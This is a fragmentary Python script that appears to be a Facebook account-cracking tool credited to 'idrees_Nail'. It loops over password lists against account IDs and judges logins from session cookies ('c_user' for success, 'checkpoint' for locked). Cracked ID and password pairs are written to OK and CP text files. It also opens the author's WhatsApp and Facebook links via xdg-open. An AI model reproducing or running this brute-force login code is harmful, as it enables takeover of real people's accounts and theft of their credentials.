...
os.system('xdg-open http://wa.me/+93777934931')
...
import uuid
import os,sys,time,json,random,re,string,platform,base64
os.system('xdg-open https://www.facebook.com/nagialai.mohmandy?mibextid=ZbWKwL')
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
...
\33[1;37m----------------------------------------------
→   Owner      :  idrees_Nail
→  Facebook    :  idrees_Nail
→TELEGRAM      : 93777934931
→   Tools        :  RANDOM 
\x1b[1;97m→   Version    :  0.0
\33[1;37m----------------------------------------------""")
...
def riaz():
	...
	if riaz1 =='5':
		riaz()
	if riaz1 =='4':
		os.system('xdg-open http://wa.me/+93777934931text=SN.JAN💜🐰Sir😪💕')
	if riaz1 =='3':
		os.system('xdg-openhttps://www.facebook.com/nagialai.mohmandy?mibextid=ZbWKwL');riaz()
	if riaz1 =='2':
		bangla()
	else:
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[idrees_Nail-OK] '+cid+'|'+ps+'\033[0;97m')
                open('idrees_Nail-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[idree_Nail-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('idrees_Nail-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97midrees-Nail\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
